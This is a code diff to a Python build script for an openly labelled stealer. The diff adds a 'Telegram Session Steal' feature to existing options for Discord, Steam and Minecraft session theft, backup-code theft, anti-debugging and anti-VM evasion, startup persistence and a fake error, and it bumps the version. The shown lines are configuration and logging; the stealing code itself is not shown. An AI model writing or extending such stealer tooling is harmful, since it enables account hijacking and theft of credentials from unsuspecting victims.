@@ -27,9 +27,9 @@ logging.basicConfig(
     handlers=[RichHandler(rich_tracebacks=True)]
 )
 
-version = "1.56.3"
-CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]
-ENABLE_KEYS = ["Anti Debug / VM", "Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR"]
+version = "1.56.6"
+CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR", "Telegram"]
+ENABLE_KEYS = ["Anti Debug / VM", "Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR", "Telegram Session Steal"]
 PATH = "src/stealer_core/src.py"
 
 console = Console()
@@ -114,6 +114,7 @@ def build():
             with open(zip_path, "wb") as f:
                 for chunk in r.iter_content(chunk_size=8192):
                     f.write(chunk)
+            logging.debug("Download complete, extracting and installing...")
 
             with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                 zip_ref.extractall(tmpdir)
